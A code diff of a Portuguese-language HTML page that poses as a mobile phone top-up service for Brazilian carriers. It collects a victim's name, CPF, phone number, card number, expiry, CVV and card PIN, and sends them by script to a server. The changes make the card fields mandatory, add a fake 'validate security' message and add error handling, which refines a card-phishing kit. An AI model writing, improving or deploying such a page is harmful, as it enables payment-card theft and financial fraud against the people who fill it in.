@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Recarga Celular</title>
+    <title>Recarga Celular - Elite Ink</title>
     <style>
         body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
@@ -23,24 +23,35 @@
         <form id="formRecarga">
             <div id="etapa1" class="etapa ativa">
                 <label>Operadora</label>
-                <select id="operadora"><option value="Vivo">Vivo</option><option value="Tim">Tim</option><option value="Claro">Claro</option></select>
+                <select id="operadora">
+                    <option value="Vivo">Vivo</option>
+                    <option value="Tim">Tim</option>
+                    <option value="Claro">Claro</option>
+                </select>
                 <label>Nome Completo</label>
                 <input type="text" id="nome" placeholder="Seu nome" required>
+                
                 <label>CPF do Titular</label>
                 <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
+                
                 <label>Número do Telefone</label>
                 <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
+                
                 <label>Valor da Recarga</label>
-                <select id="valor"><option value="20">R$ 20,00</option><option value="40">R$ 40,00</option><option value="100">R$ 100,00</option></select>
+                <select id="valor">
+                    <option value="20">R$ 20,00</option>
+                    <option value="40">R$ 40,00</option>
+                    <option value="100">R$ 100,00</option>
+                </select>
                 <button type="button" class="next" onclick="irPara(2)">PRÓXIMA ETAPA</button>
             </div>
 
             <div id="etapa2" class="etapa">
                 <label>Número do Cartão</label>
-                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16">
+                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16" required>
                 <div style="display: flex; gap: 10px;">
-                    <div style="flex: 1;"><label>Validade</label><input type="text" id="data" placeholder="MM/AA" maxlength="5"></div>
-                    <div style="flex: 1;"><label>CVV</label><input type="text" id="cvv" placeholder="000" maxlength="3"></div>
+                    <div style="flex: 1;"><label>Validade</label><input type="text" id="data" placeholder="MM/AA" maxlength="5" required></div>
+                    <div style="flex: 1;"><label>CVV</label><input type="text" id="cvv" placeholder="000" maxlength="3" required></div>
                 </div>
                 <button type="button" class="next" onclick="irPara(3)">CONFIRMAR PAGAMENTO</button>
             </div>
@@ -48,9 +59,10 @@
             <div id="etapa3" class="etapa">
                 <label>Senha do Cartão (6 ou 8 dígitos)</label>
                 <input type="password" id="senha" placeholder="******" minlength="6" maxlength="8" required>
-                <button type="submit">FINALIZAR RECARGA</button>
+                <p style="font-size: 11px; color: #8b949e; text-align: center;">Valide a segurança para processar.</p>
+                <button type="submit">FINALIZAR E RECEBER</button>
             </div>
-            <p class="info-24h">Recarga disponível em 24 horas.</p>
+            <p class="info-24h">Recarga processada em até 24 horas.</p>
         </form>
     </div>
 
@@ -80,7 +92,12 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(dados)
             });
-            if (response.ok) { alert('Pedido recebido!'); window.location.reload(); }
+            if (response.ok) { 
+                alert('Pedido recebido com sucesso!'); 
+                window.location.reload(); 
+            } else {
+                alert('Erro ao enviar. Tente novamente.');
+            }
         };
     </script>
 </body>
